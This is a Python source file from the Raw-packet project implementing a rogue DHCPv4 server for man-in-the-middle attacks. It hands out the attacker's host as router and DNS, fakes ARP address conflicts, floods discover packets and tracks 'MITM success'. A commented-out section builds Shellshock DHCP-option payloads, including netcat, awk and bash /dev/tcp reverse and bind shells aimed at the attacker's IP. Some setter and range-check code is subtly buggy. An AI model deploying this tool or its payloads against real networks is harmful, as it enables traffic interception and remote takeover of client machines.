# region Description
"""
dhcpv4_server.py: DHCPv4 server (dhcpv4_server)
Author: Vladimir Ivanov
License: MIT
Copyright 2020, Raw-packet Project
"""
# endregion

# region Import
from raw_packet.Utils.base import Base
from raw_packet.Utils.utils import Utils
from raw_packet.Utils.tm import ThreadManager
from raw_packet.Utils.network import RawSniff, RawSend, RawEthernet, RawARP, RawDHCPv4
from typing import List, Union, Dict, Any
from random import randint
from time import sleep
# endregion

# region Authorship information
__author__ = 'Vladimir Ivanov'
__copyright__ = 'Copyright 2020, Raw-packet Project'
__credits__ = ['']
__license__ = 'MIT'
__version__ = '0.2.1'
__maintainer__ = 'Vladimir Ivanov'
__email__ = 'ivanov.vladimir.mail@gmail.com'
__status__ = 'Development'
# endregion


# region class DHCPv4Server
class DHCPv4Server:

    # region Set properties
    _base: Base = Base()
    _utils: Utils = Utils()
    _sniff: RawSniff = RawSniff()
    _arp: RawARP = RawARP()
    _eth: RawEthernet = RawEthernet()
    _dhcpv4: RawDHCPv4 = RawDHCPv4()
    _thread_manager: ThreadManager = ThreadManager(10)

    _your: Dict[str, Union[None, str]] = {'network-interface': None, 'mac-address': None, 'ipv4-address': None}
    _target: Dict[str, Union[None, str]] = {'mac-address': None, 'ipv4-address': None}
    _domain_search: Union[None, bytes] = None
    
    _free_ip_addresses: List[str] = list()
    _clients: Dict[str, Union[str, Dict[str, Union[bool, str]]]] = dict()

    _lease_time: int = 172800
    _shellshock_option_code: int = 114

    _discover_sender_is_work: bool = False
    _discover_sender_delay: float = 0.25

    _send_dhcp_discover_packets: bool = False
    _send_dhcp_offer_packets: bool = True
    _send_broadcast_dhcp_response: bool = False
    
    _exit_on_success: bool = False
    _apple: bool = False
    _quiet: bool = True
    # endregion

    # region Init
    def __init__(self, network_interface: str):
        self._your = self._base.get_interface_settings(interface_name=network_interface,
                                                       required_parameters=['mac-address',
                                                                            'ipv4-address',
                                                                            'ipv4-netmask',
                                                                            'first-ipv4-address',
                                                                            'second-ipv4-address',
                                                                            'penultimate-ipv4-address',
                                                                            'last-ipv4-address'])
        self._ipv4_network_mask: str = self._your['ipv4-netmask']
        self._first_offer_ipv4_address: str = self._your['second-ipv4-address']
        self._last_offer_ipv4_address: str = self._your['penultimate-ipv4-address']
        self._dhcp_server_mac_address: str = self._your['mac-address']
        self._dhcp_server_ipv4_address: str = self._your['ipv4-address']
        self._dns_server_ipv4_address: str = self._your['ipv4-address']
        self._tftp_server_ipv4_address: str = self._your['ipv4-address']
        self._wins_server_ipv4_address: str = self._your['ipv4-address']
        self._router_ipv4_address: str = self._your['ipv4-address']
        self._raw_send: RawSend = RawSend(network_interface=network_interface)
    # endregion
    
    # region Start DHCPv4 server
    def start(self,
              target_mac_address: Union[None, str] = None,
              target_ipv4_address: Union[None, str] = None,
              ipv4_network_mask: Union[None, str] = None,
              first_offer_ipv4_address: Union[None, str] = None,
              last_offer_ipv4_address: Union[None, str] = None,
              dhcp_server_mac_address: Union[None, str] = None,
              dhcp_server_ipv4_address: Union[None, str] = None,
              dns_server_ipv4_address: Union[None, str] = None,
              tftp_server_ipv4_address: Union[None, str] = None,
              wins_server_ipv4_address: Union[None, str] = None,
              router_ipv4_address: Union[None, str] = None,
              domain_search: str = 'domain.local',
              lease_time: int = 172800,
              shellshock_option_code: int = 114,
              send_dhcp_discover_packets: bool = False,
              send_dhcp_offer_packets: bool = False,
              send_broadcast_dhcp_response: bool = False,
              exit_on_success: bool = False,
              apple: bool = False,
              quiet: bool = False):

        # region Set variables
        self._lease_time = lease_time
        self._domain_search = domain_search.encode('utf-8')
        self._send_dhcp_discover_packets = send_dhcp_discover_packets
        self._send_dhcp_offer_packets = send_dhcp_offer_packets
        self._send_broadcast_dhcp_response = send_broadcast_dhcp_response
        self._exit_on_success = exit_on_success
        self._apple = apple
        self._quiet = quiet
        # endregion

        # region Get your network settings
        if ipv4_network_mask is not None:
            self._ipv4_network_mask = ipv4_network_mask
        # endregion

        # region Set target MAC and IP address, if target IP is not set - get first and last offer IP

        # region Target MAC address is set
        if target_mac_address is not None:
            self._target['mac-address'] = self._utils.check_mac_address(mac_address=target_mac_address,
                                                                        parameter_name='target MAC address')
        # endregion

        # region Target IP is set
        if target_ipv4_address is not None:
            assert self._target['mac-address'] is not None, \
                'Please set target MAC address' + \
                ', for target IP address: ' + self._base.info_text(target_ipv4_address)
            self._target['ipv4-address'] = \
                self._utils.check_ipv4_address(network_interface=self._your['network-interface'],
                                               ipv4_address=target_ipv4_address,
                                               parameter_name='target IPv4 address')
        # endregion

        # region Target IP is not set - get first and last offer IP
        else:
            # Check first offer IP address
            if first_offer_ipv4_address is not None:
                self._first_offer_ipv4_address = \
                    self._utils.check_ipv4_address(network_interface=self._your['network-interface'],
                                                   ipv4_address=first_offer_ipv4_address,
                                                   parameter_name='first offer IPv4 address')

            # Check last offer IP address
            if last_offer_ipv4_address is not None:
                self._last_offer_ipv4_address = \
                    self._utils.check_ipv4_address(network_interface=self._your['network-interface'],
                                                   ipv4_address=last_offer_ipv4_address,
                                                   parameter_name='last offer IPv4 address')
        # endregion

        # endregion

        # region Set DHCP sever MAC and IP address
        if dhcp_server_mac_address is not None:
            self._dhcp_server_mac_address = \
                self._utils.check_mac_address(mac_address=dhcp_server_mac_address,
                                              parameter_name='DHCPv4 server MAC address')

        if dhcp_server_ipv4_address is not None:
            self._dhcp_server_ipv4_address = \
                self._utils.check_ipv4_address(network_interface=self._your['network-interface'],
                                               ipv4_address=dhcp_server_ipv4_address,
                                               parameter_name='DHCPv4 server IPv4 address')
        # endregion

        # region Set router, dns, tftp, wins IP address

        # region Set router IP address
        if router_ipv4_address is not None:
            self._router_ipv4_address = \
                self._utils.check_ipv4_address(network_interface=self._your['network-interface'],
                                               ipv4_address=dhcp_server_ipv4_address,
                                               parameter_name='router IPv4 address')
        # endregion

        # region Set DNS server IP address
        if dns_server_ipv4_address is not None:
            assert self._base.ip_address_validation(dns_server_ipv4_address), \
                'Bad DNS server IPv4 address: ' + self._base.info_text(dns_server_ipv4_address)
            self._dns_server_ipv4_address = dns_server_ipv4_address
        # endregion

        # region Set TFTP server IP address
        if tftp_server_ipv4_address is not None:
            self._tftp_server_ipv4_address = \
                self._utils.check_ipv4_address(network_interface=self._your['network-interface'],
                                               ipv4_address=tftp_server_ipv4_address,
                                               parameter_name='TFTP server IPv4 address')
        # endregion

        # region Set WINS server IP address
        if wins_server_ipv4_address is not None:
            self._wins_server_ipv4_address = \
                self._utils.check_ipv4_address(network_interface=self._your['network-interface'],
                                               ipv4_address=tftp_server_ipv4_address,
                                               parameter_name='WINS server IPv4 address')
        # endregion

        # endregion

        # region Set Shellshock option code
        if 255 < shellshock_option_code < 0:
            self._base.print_error('Bad Shellshock option code: ', str(shellshock_option_code),
                                   '; This value should be in the range from 1 to 254')
            exit(1)
        else:
            self._shellshock_option_code = shellshock_option_code
        # endregion

        # region General output
        if not self._quiet:
            self._base.print_info('Network interface: ', self._your['network-interface'])
            self._base.print_info('Your IP address: ', self._your['ipv4-address'])
            self._base.print_info('Your MAC address: ', self._your['mac-address'])

            if self._target['mac-address'] is not None:
                self._base.print_info('Target MAC: ', self._target['mac-address'])

            # If target IP address is set print target IP, else print first and last offer IP
            if self._target['ipv4-address'] is not None:
                self._base.print_info('Target IP: ', self._target['ipv4-address'])
            else:
                self._base.print_info('First offer IP: ', self._first_offer_ipv4_address)
                self._base.print_info('Last offer IP: ', self._last_offer_ipv4_address)

            self._base.print_info('DHCP server mac address: ', self._dhcp_server_mac_address)
            self._base.print_info('DHCP server ip address: ', self._dhcp_server_ipv4_address)
            self._base.print_info('Router IP address: ', self._router_ipv4_address)
            self._base.print_info('DNS server IP address: ', self._dns_server_ipv4_address)
            self._base.print_info('TFTP server IP address: ', self._tftp_server_ipv4_address)
            self._base.print_info('WINS server IP address: ', self._wins_server_ipv4_address)
        # endregion

        # region Add ip addresses in list with free ip addresses from first to last offer IP
        if self._target['ipv4-address'] is None:
            self._base.print_info('Create list with free IP addresses in your network ...')
            self._free_ip_addresses = \
                self._utils.get_free_ipv4_addresses(network_interface=self._your['network-interface'],
                                                    first_ipv4_address=self._first_offer_ipv4_address,
                                                    last_ipv4_address=last_offer_ipv4_address,
                                                    quiet=self._quiet)
        # endregion

        # region Send DHCP discover packets in the background thread
        if self._send_dhcp_discover_packets:
            if not self._quiet:
                self._base.print_info('Start DHCP discover packets send in the background thread ...')
                self._base.print_info('Delay between DHCP discover packets: ', str(self._discover_sender_delay))
            self._thread_manager.add_task(self._discover_sender)
        # endregion

        # region Sniff network

        # region Print info message
        self._base.print_info('Waiting for a ARP or DHCP requests ...')
        # endregion

        # region Set sniff filters
        sniff_filters: Dict = {'Ethernet': {'not-source': self._your['mac-address']},
                               'ARP': {'opcode': 1},
                               'UDP': {'destination-port': 67, 'source-port': 68}}
        scapy_lfilter: Any = lambda eth: eth.src != self._your['mac-address']

        if self._target['mac-address'] is not None:
            sniff_filters['Ethernet'] = {'source': self._target['mac-address']}
            scapy_lfilter: Any = lambda eth: eth.src == self._target['mac-address']
        # endregion

        # region Start sniffer
        self._sniff.start(protocols=['ARP', 'IPv4', 'UDP', 'DHCPv4'], prn=self._reply,
                          filters=sniff_filters,
                          network_interface=self._your['network-interface'],
                          scapy_filter='arp or (udp and (port 67 or 68))',
                          scapy_lfilter=scapy_lfilter)
        # endregion

        # endregion

    # endregion

    # region Add client info in clients dictionary
    def _add_client_info_in_dictionary(self,
                                       client_mac_address: str,
                                       client_info: Union[bool, str, Dict[str, Union[bool, str]]],
                                       this_client_already_in_dictionary: bool = False) -> None:
        if this_client_already_in_dictionary:
            self._clients[client_mac_address].update(client_info)
        else:
            self._clients[client_mac_address] = client_info
    # endregion

    # region Make DHCP offer packet
    def _make_dhcp_offer_packet(self,
                                transaction_id: int, offer_ip: str, client_mac: str,
                                destination_mac: Union[None, str] = None,
                                destination_ip: Union[None, str] = None) -> Union[None, bytes]:
        if destination_mac is None:
            destination_mac = 'ff:ff:ff:ff:ff:ff'
        if destination_ip is None:
            destination_ip = '255.255.255.255'
        return self._dhcpv4.make_response_packet(ethernet_src_mac=self._dhcp_server_mac_address,
                                                 ethernet_dst_mac=destination_mac,
                                                 ip_src=self._dhcp_server_ipv4_address,
                                                 ip_dst=destination_ip,
                                                 transaction_id=transaction_id,
                                                 dhcp_message_type=2,
                                                 your_client_ip=offer_ip,
                                                 client_mac=client_mac,
                                                 dhcp_server_id=self._dhcp_server_ipv4_address,
                                                 lease_time=self._lease_time,
                                                 netmask=self._ipv4_network_mask,
                                                 router=self._router_ipv4_address,
                                                 dns=self._dns_server_ipv4_address,
                                                 payload=None)
    # endregion
    
    # region Make DHCP ack packet
    def _make_dhcp_ack_packet(self,
                              transaction_id: int, target_mac: str, target_ip: str,
                              destination_mac: Union[None, str] = None,
                              destination_ip: Union[None, str] = None,
                              shellshock_payload: Union[None, str] = None) -> Union[None, bytes]:
        if destination_mac is None:
            destination_mac: str = 'ff:ff:ff:ff:ff:ff'
        if destination_ip is None:
            destination_ip: str = '255.255.255.255'

        return self._dhcpv4.make_response_packet(ethernet_src_mac=self._dhcp_server_mac_address,
                                                 ethernet_dst_mac=destination_mac,
                                                 ip_src=self._dhcp_server_ipv4_address,
                                                 ip_dst=destination_ip,
                                                 transaction_id=transaction_id,
                                                 dhcp_message_type=5,
                                                 your_client_ip=target_ip,
                                                 client_mac=target_mac,
                                                 dhcp_server_id=self._dhcp_server_ipv4_address,
                                                 lease_time=self._lease_time,
                                                 netmask=self._ipv4_network_mask,
                                                 router=self._router_ipv4_address,
                                                 dns=self._dns_server_ipv4_address,
                                                 payload=shellshock_payload,
                                                 payload_option_code=self._shellshock_option_code,
                                                 domain=self._domain_search,
                                                 tftp=self._tftp_server_ipv4_address,
                                                 wins=self._wins_server_ipv4_address)
    # endregion
    
    # region Make DHCP nak packet
    def _make_dhcp_nak_packet(self,
                              transaction_id: int, target_mac: str,
                              target_ip: str, requested_ip: str) -> Union[None, bytes]:
        return self._dhcpv4.make_nak_packet(ethernet_src_mac=self._dhcp_server_mac_address,
                                            ethernet_dst_mac=target_mac,
                                            ip_src=self._dhcp_server_ipv4_address,
                                            ip_dst=requested_ip,
                                            transaction_id=transaction_id,
                                            your_client_ip=target_ip,
                                            client_mac=target_mac,
                                            dhcp_server_id=self._dhcp_server_ipv4_address)
    # endregion
    
    # region Send DHCP discover packets
    def _discover_sender(self, number_of_packets=999999) -> None:
        packet_index = 0
        self._discover_sender_is_work = True
        while packet_index < number_of_packets:
            try:
                self._raw_send.send_packet(self._dhcpv4.make_discover_packet(ethernet_src_mac=self._your['mac-address'],
                                                                      client_mac=self._eth.make_random_mac(),
                                                                      host_name=self._base.make_random_string(),
                                                                      relay_agent_ip=self._your['ipv4-address']))
                sleep(self._discover_sender_delay)
            except TypeError:
                self._base.print_error('Something went wrong when sending DHCP discover packets!')
                break
            packet_index += 1
        self._discover_sender_is_work = False
    # endregion
    
    # region Reply to DHCPv4 and ARP requests
    def _reply(self, packet):
    
        # region DHCP
        if 'DHCPv4' in packet.keys():
    
            # region Get transaction id and client MAC address
            transaction_id = packet['BOOTP']['transaction-id']
            client_mac_address = packet['BOOTP']['client-mac-address']
            # endregion
    
            # region Check this client already in dict
            client_already_in_dictionary = False
            if client_mac_address in self._clients.keys():
                client_already_in_dictionary = True
            # endregion

            # region DHCP DISCOVER
            if packet['DHCPv4'][53] == 1:

                # region Print INFO message
                self._base.print_info('DHCP DISCOVER from: ', client_mac_address,
                                      ' transaction id: ', hex(transaction_id))
                # endregion

                # If parameter 'Do not send DHCP OFFER packets' is not set
                if not self._send_dhcp_offer_packets:

                    # region Start DHCP discover sender
                    if self._send_dhcp_discover_packets:
                        if not self._discover_sender_is_work:
                            self._discover_sender(100)
                    # endregion

                    # If target IP address is set - offer IP = target IP
                    if self._target['ipv4-address'] is not None:
                        offer_ip_address = self._target['ipv4-address']

                    # If target IP address is not set - offer IP = random IP from free IP addresses list
                    else:
                        random_index = randint(0, len(self._free_ip_addresses))
                        offer_ip_address = self._free_ip_addresses[random_index]

                        # Delete offer IP from free IP addresses list
                        del self._free_ip_addresses[random_index]

                    if self._send_broadcast_dhcp_response:
                        offer_packet = \
                            self._make_dhcp_offer_packet(transaction_id, offer_ip_address, client_mac_address)
                    else:
                        offer_packet = \
                            self._make_dhcp_offer_packet(transaction_id, offer_ip_address, client_mac_address,
                                                         client_mac_address, offer_ip_address)

                    self._raw_send.send_packet(offer_packet)

                    # Add client info in global self._clients dictionary
                    self._add_client_info_in_dictionary(client_mac_address,
                                                        {'transaction': transaction_id,
                                                         'discover': True,
                                                         'offer_ip': offer_ip_address},
                                                        client_already_in_dictionary)

                    # Print INFO message
                    self._base.print_info('DHCP OFFER to: ', client_mac_address, ' offer IP: ', offer_ip_address)

            # endregion

            # region DHCP RELEASE
            if packet['DHCPv4'][53] == 7:
                if packet['BOOTP']['client-ip-address'] is not None:
                    client_ip = packet['BOOTP']['client-ip-address']
                    self._base.print_info('DHCP RELEASE from: ', client_ip + ' (' + client_mac_address + ')',
                                          ' transaction id: ', hex(transaction_id))

                    # Add client info in global self._clients dictionary
                    self._add_client_info_in_dictionary(client_mac_address,
                                                        {'client_ip': client_ip},
                                                        client_already_in_dictionary)
                    # print self._clients

                    # Add release client IP in free IP addresses list
                    if client_ip not in self._free_ip_addresses:
                        self._free_ip_addresses.append(client_ip)
                else:
                    self._base.print_info('DHCP RELEASE from: ', client_mac_address, ' transaction id: ',
                                          hex(transaction_id))

                # Add client info in global self._clients dictionary
                self._add_client_info_in_dictionary(client_mac_address,
                                                    {'release': True},
                                                    client_already_in_dictionary)
                # print self._clients
            # endregion

            # region DHCP INFORM
            if packet['DHCPv4'][53] == 8:
                if packet['BOOTP']['client-ip-address'] is not None:
                    client_ip = packet['BOOTP']['client-ip-address']
                    self._base.print_info('DHCP INFORM from: ', client_ip + ' (' + client_mac_address + ')',
                                          ' transaction id: ', hex(transaction_id))

                    # If client IP in free IP addresses list delete this
                    if client_ip in self._free_ip_addresses:
                        self._free_ip_addresses.remove(client_ip)

                    # Add client info in global self._clients dictionary
                    self._add_client_info_in_dictionary(client_mac_address,
                                                        {'client_ip': client_ip},
                                                        client_already_in_dictionary)
                    # print self._clients

                else:
                    self._base.print_info('DHCP INFORM from: ', client_mac_address, ' transaction id: ',
                                          hex(transaction_id))

                # Add client info in global self._clients dictionary
                self._add_client_info_in_dictionary(client_mac_address,
                                                    {'inform': True},
                                                    client_already_in_dictionary)
                # print self._clients
            # endregion

            # region DHCP REQUEST
            if packet['DHCPv4'][53] == 3:

                # region Set local variables
                requested_ip = '0.0.0.0'
                offer_ip = None
                # endregion

                # region Get requested IP
                if 50 in packet['DHCPv4'].keys():
                    requested_ip = str(packet['DHCPv4'][50])
                # endregion

                # region Print info message
                self._base.print_info('DHCP REQUEST from: ', client_mac_address, ' transaction id: ',
                                      hex(transaction_id),
                                      ' requested ip: ', requested_ip)
                # endregion

                # region Requested IP not in range from first offer IP to last offer IP
                if not self._base.ip_address_in_range(requested_ip, self._first_offer_ipv4_address,
                                                      self._last_offer_ipv4_address):
                    self._base.print_warning('Client: ', client_mac_address, ' requested IP: ', requested_ip,
                                             ' not in range: ',
                                             self._first_offer_ipv4_address + ' - ' + self._last_offer_ipv4_address)
                # endregion

                # region Requested IP in range from first offer IP to last offer IP
                else:
                    # region Start DHCP discover sender
                    if self._send_dhcp_discover_packets:
                        if not self._discover_sender_is_work:
                            self._discover_sender(100)
                    # endregion

                    # region Change client info in global self._clients dictionary

                    # Add client info in global self._clients dictionary
                    self._add_client_info_in_dictionary(client_mac_address,
                                                        {'packet': True, 'requested_ip': requested_ip,
                                                         'transaction': transaction_id},
                                                        client_already_in_dictionary)

                    # Delete ARP mitm success keys in dictionary for this client
                    self._clients[client_mac_address].pop('client request his ip', None)
                    self._clients[client_mac_address].pop('client request router ip', None)
                    self._clients[client_mac_address].pop('client request dns ip', None)

                    # endregion

                    # region Get offer IP address
                    try:
                        offer_ip = self._clients[client_mac_address]['offer_ip']
                    except KeyError:
                        pass
                    # endregion

                    # region This client already send DHCP DISCOVER and offer IP != requested IP
                    if offer_ip is not None and offer_ip != requested_ip:
                        # Print error message
                        self._base.print_error('Client: ', client_mac_address, ' requested IP: ', requested_ip,
                                               ' not like offer IP: ', offer_ip)

                        # Create and send DHCP nak packet
                        nak_packet = \
                            self._make_dhcp_nak_packet(transaction_id, client_mac_address, offer_ip, requested_ip)
                        self._raw_send.send_packet(nak_packet)
                        self._base.print_info('DHCP NAK to: ', client_mac_address, ' requested ip: ', requested_ip)

                        # Add client info in global self._clients dictionary
                        self._add_client_info_in_dictionary(client_mac_address,
                                                            {'mitm': 'error: offer ip not like requested ip',
                                                             'offer_ip': None},
                                                            client_already_in_dictionary)
                        # print self._clients
                    # endregion

                    # region Offer IP == requested IP or this is a first packet from this client
                    else:

                        # region Target IP address is set and requested IP != target IP
                        if self._target['ipv4-address'] is not None and requested_ip != self._target['ipv4-address']:

                            # Print error message
                            self._base.print_error('Client: ', client_mac_address, ' requested IP: ', requested_ip,
                                                   ' not like target IP: ', self._target['ipv4-address'])

                            # Create and send DHCP nak packet
                            nak_packet = self._make_dhcp_nak_packet(transaction_id, client_mac_address,
                                                                    self._target['ipv4-address'], requested_ip)
                            self._raw_send.send_packet(nak_packet)
                            self._base.print_info('DHCP NAK to: ', client_mac_address, ' requested ip: ', requested_ip)

                            # Add client info in global self._clients dictionary
                            self._add_client_info_in_dictionary(client_mac_address,
                                                                {'mitm': 'error: target ip not like requested ip',
                                                                 'offer_ip': None, 'nak': True},
                                                                client_already_in_dictionary)

                        # endregion

                        # region Target IP address is set and requested IP == target IP or Target IP is not set
                        else:

                            # # region Settings shellshock payload
                            # payload: Union[None, str] = None
                            # shellshock_payload: Union[None, str] = None
                            #
                            # try:
                            #     assert args.shellshock_command is not None \
                            #            or args.bind_shell \
                            #            or args.nc_reverse_shell \
                            #            or args.nce_reverse_shell \
                            #            or args.bash_reverse_shell, 'ShellShock not used!'
                            #     # region Create payload
                            #
                            #     # Network settings command in target machine
                            #     net_settings = args.ip_path + 'ip addr add ' + requested_ip + '/' + \
                            #                    str(IPAddress(self._ipv4_network_mask).netmask_bits()) + \
                            #                    ' dev ' + args.iface_name + ';'
                            #
                            #     # Shellshock payload: <user bash command>
                            #     if args.shellshock_command is not None:
                            #         payload = args.shellshock_command
                            #
                            #     # Shellshock payload:
                            #     # awk 'BEGIN{s='/inet/tcp/<bind_port>/0/0';for(;s|&getline c;close(c))while(c|getline)print|&s;close(s)}' &
                            #     if args.bind_shell:
                            #         payload = 'awk \'BEGIN{s=\'/inet/tcp/' + str(args.bind_port) + \
                            #                   '/0/0\';for(;s|&getline c;close(c))while(c|getline)print|&s;close(s)}\' &'
                            #
                            #     # Shellshock payload:
                            #     # rm /tmp/f 2>/dev/null;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <your_ip> <your_port> >/tmp/f &
                            #     if args.nc_reverse_shell:
                            #         payload = 'rm /tmp/f 2>/dev/null;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ' + \
                            #                   your_ip_address + ' ' + str(args.reverse_port) + ' >/tmp/f &'
                            #
                            #     # Shellshock payload:
                            #     # /bin/nc -e /bin/sh <your_ip> <your_port> 2>&1 &
                            #     if args.nce_reverse_shell:
                            #         payload = '/bin/nc -e /bin/sh ' + your_ip_address + ' ' + str(args.reverse_port) + ' 2>&1 &'
                            #
                            #     # Shellshock payload:
                            #     # /bin/bash -i >& /dev/tcp/<your_ip>/<your_port> 0>&1 &
                            #     if args.bash_reverse_shell:
                            #         payload = '/bin/bash -i >& /dev/tcp/' + your_ip_address + \
                            #                   '/' + str(args.reverse_port) + ' 0>&1 &'
                            #
                            #     if payload is not None:
                            #
                            #         # Do not add network settings command in payload
                            #         if not args.without_network:
                            #             payload = net_settings + payload
                            #
                            #         # Send payload to target in clear text
                            #         if args.without_self._base64:
                            #             shellshock_payload = '() { :; }; ' + payload
                            #
                            #         # Send self._base64 encoded payload to target in clear text
                            #         else:
                            #             payload = b64encode(payload)
                            #             shellshock_payload = '() { :; }; /bin/sh <(/usr/bin/self._base64 -d <<< ' + payload + ')'
                            #     # endregion
                            #
                            #     # region Check Shellshock payload length
                            #     if shellshock_payload is not None:
                            #         if len(shellshock_payload) > 255:
                            #             self._base.print_error('Length of shellshock payload is very big! Current length: ',
                            #                              str(len(shellshock_payload)), ' Maximum length: ', '254')
                            #             shellshock_payload = None
                            #     # endregion
                            #
                            # except AssertionError:
                            #     pass
                            # # endregion

                            # region Send DHCP ack and print info message
                            if self._send_broadcast_dhcp_response:
                                ack_packet = self._make_dhcp_ack_packet(transaction_id=transaction_id,
                                                                        target_mac=client_mac_address,
                                                                        target_ip=requested_ip)
                            else:
                                ack_packet = self._make_dhcp_ack_packet(transaction_id=transaction_id,
                                                                        target_mac=client_mac_address,
                                                                        target_ip=requested_ip,
                                                                        destination_mac=client_mac_address,
                                                                        destination_ip=requested_ip)

                            if self._apple:
                                self._base.print_info('DHCP ACK to: ', client_mac_address,
                                                      ' requested ip: ', requested_ip)
                                for _ in range(3):
                                    self._raw_send.send_packet(ack_packet)
                                    sleep(0.2)
                            else:
                                self._raw_send.send_packet(ack_packet)
                                self._base.print_info('DHCP ACK to: ', client_mac_address,
                                                      ' requested ip: ', requested_ip)
                            # endregion

                            # region Add client info in global self._clients dictionary
                            try:
                                self._clients[client_mac_address].update({'mitm': 'success'})
                            except KeyError:
                                self._clients[client_mac_address] = {'mitm': 'success'}
                            # endregion

                        # endregion

                    # endregion

                # endregion

            # endregion

            # region DHCP DECLINE
            if packet['DHCPv4'][53] == 4:
                # Get requested IP
                requested_ip = '0.0.0.0'
                if 50 in packet['DHCPv4'].keys():
                    requested_ip = str(packet['DHCPv4'][50])

                # Print info message
                self._base.print_info('DHCP DECLINE from: ', requested_ip + ' (' + client_mac_address + ')',
                                      ' transaction id: ', hex(transaction_id))

                # If client IP in free IP addresses list delete this
                if requested_ip in self._free_ip_addresses:
                    self._free_ip_addresses.remove(requested_ip)

                # Add client info in global self._clients dictionary
                self._add_client_info_in_dictionary(client_mac_address,
                                                    {'decline_ip': requested_ip, 'decline': True},
                                                    client_already_in_dictionary)
                # print self._clients
            # endregion
    
        # endregion DHCP
    
        # region ARP
        if 'ARP' in packet.keys():
            if packet['Ethernet']['destination'] == 'ff:ff:ff:ff:ff:ff' and \
                    packet['ARP']['target-mac'] == '00:00:00:00:00:00':
    
                # region Set local variables
                arp_sender_mac_address = packet['ARP']['sender-mac']
                arp_sender_ip_address = packet['ARP']['sender-ip']
                arp_target_ip_address = packet['ARP']['target-ip']
                # endregion
    
                # region Print info message
                self._base.print_info('ARP packet from: ', arp_sender_mac_address,
                                      ' "Who has ', arp_target_ip_address, 
                                      ' Tell ', arp_sender_ip_address, '"')
                # endregion
    
                # region Get client mitm status
                try:
                    mitm_status = self._clients[arp_sender_mac_address]['mitm']
                except KeyError:
                    mitm_status = ''
                # endregion
    
                # region Get client requested ip
                try:
                    requested_ip = self._clients[arp_sender_mac_address]['requested_ip']
                except KeyError:
                    requested_ip = ''
                # endregion
    
                # region Create IPv4 address conflict
                if mitm_status.startswith('error'):
                    arp_reply = self._arp.make_response(ethernet_src_mac=self._your['mac-address'],
                                                        ethernet_dst_mac=arp_sender_mac_address,
                                                        sender_mac=self._your['mac-address'],
                                                        sender_ip=arp_target_ip_address,
                                                        target_mac=arp_sender_mac_address,
                                                        target_ip=arp_sender_ip_address)
                    self._raw_send.send_packet(arp_reply)
                    self._base.print_info('ARP response to: ', arp_sender_mac_address,
                                          ' "', arp_target_ip_address + ' is at ' + self._your['mac-address'],
                                          '" (IPv4 address conflict)')
                # endregion
    
                # region MITM success
                if mitm_status.startswith('success'):
    
                    if arp_target_ip_address == requested_ip:
                        self._clients[arp_sender_mac_address].update({'client request his ip': True})
    
                    if arp_target_ip_address == self._router_ipv4_address:
                        self._clients[arp_sender_mac_address].update({'client request router ip': True})
    
                    if arp_target_ip_address == self._dns_server_ipv4_address:
                        self._clients[arp_sender_mac_address].update({'client request dns ip': True})
    
                    try:
                        assert self._clients[arp_sender_mac_address]['client request his ip']
                        assert self._clients[arp_sender_mac_address]['client request router ip']
                        assert self._clients[arp_sender_mac_address]['client request dns ip']
    
                        assert 'success message' not in self._clients[arp_sender_mac_address].keys()
                        self._base.print_success('MITM success: ', requested_ip + ' (' + arp_sender_mac_address + ')')
                        if self._exit_on_success:
                            sleep(3)
                            exit(0)
                        else:
                            self._clients[arp_sender_mac_address].update({'success message': True})
    
                    except KeyError:
                        pass

                    except AssertionError:
                        pass
    
                # endregion
    
        # endregion
    
    # endregion

# endregion
